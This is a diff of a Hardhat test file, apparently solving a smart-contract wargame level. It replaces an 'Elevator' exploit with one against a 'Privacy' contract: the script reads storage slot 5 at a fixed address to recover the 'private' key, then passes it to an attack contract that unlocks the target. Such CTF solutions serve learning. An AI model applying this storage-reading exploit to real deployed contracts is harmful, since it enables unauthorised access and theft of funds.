@@ -1,55 +1,53 @@
-import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
-import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
 import { expect } from "chai";
 import { ethers } from "hardhat";
-import { BigNumber, Contract } from "ethers";
-import { Attack, Elevator } from "../typechain-types";
-import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
-import { getContractAddress } from "ethers/lib/utils";
-import exp from "constants";
-import { boolean } from "hardhat/internal/core/params/argumentTypes";
+import { Attack, Privacy } from "../typechain-types";
 
 describe("Elevator Exploit using Contract ", function () {
   let attackerContract: Attack,
-    elevatorContract: Elevator,
-    attacker: SignerWithAddress,
+    privacyContract: Privacy,
     contractAddress: string,
-    getTop: boolean;
+    lockedValue: boolean;
 
   before("Setup for attack locally", async function () {
-    [attacker] = await ethers.getSigners();
-    //instance address of contract to attack
-    contractAddress = "0x35677D19640bE9c35e0A8199EA5b38aDeE844476";
-    // deploy reentrance contract
-    elevatorContract = await ethers.getContractAt("Elevator", contractAddress);
+    // Learn how to convert to type of bytes in hardhat.
+    contractAddress = "0xbcc275859ba7d161d3211c4165f94b8e059418f5";
 
-    const attackContractFactory = await ethers.getContractFactory("Attack");
+    privacyContract = await ethers.getContractAt("Privacy", contractAddress);
 
-    attackerContract = await attackContractFactory.deploy(
-      elevatorContract.address
-    );
+    const attackerContractFactory = await ethers.getContractFactory("Attack");
+
+    attackerContract = await attackerContractFactory.deploy(contractAddress);
 
     await attackerContract.deployed();
   });
 
   it("perform exploit", async function () {
     // // Attack flow
-    // 1 call attack contracts initiateAttack()
+    // Lets view if the privacy contract is locked
+    let originalLockedValue = await privacyContract.locked();
 
-    let txAttack = await attackerContract.initiateAttack();
+    console.log("The original locked value is: ", originalLockedValue);
+    // Grab the storageSlot data at slot 5
+    let keyData = await ethers.provider.getStorageAt(contractAddress, 5);
+
+    console.log("Key data looks like: ", keyData);
+
+    // call our custom attack contract, to unlock the privacy contract
+    // our attack contract, takes the bytes32 data at slot 5 and converts to bytes16
+    let txAttack = await attackerContract.attack(keyData);
 
     let receiptAttack = await txAttack.wait();
 
-    // view the state of top and verify that it's true
+    console.log("The receipt is", receiptAttack);
 
-    getTop = await elevatorContract.top();
+    // view the final locked value
+    lockedValue = await privacyContract.locked();
 
-    console.log("The top has been set to :", getTop);
+    console.log("The new locked value is: ", lockedValue);
   });
 
   after("confirm exploit", async function () {
-    // check that the reentrance contract == 0
-
-    expect(getTop).to.be.eq(true);
+    // if false, privacy has been exploited
+    expect(lockedValue).to.be.eq(false);
   });
 });
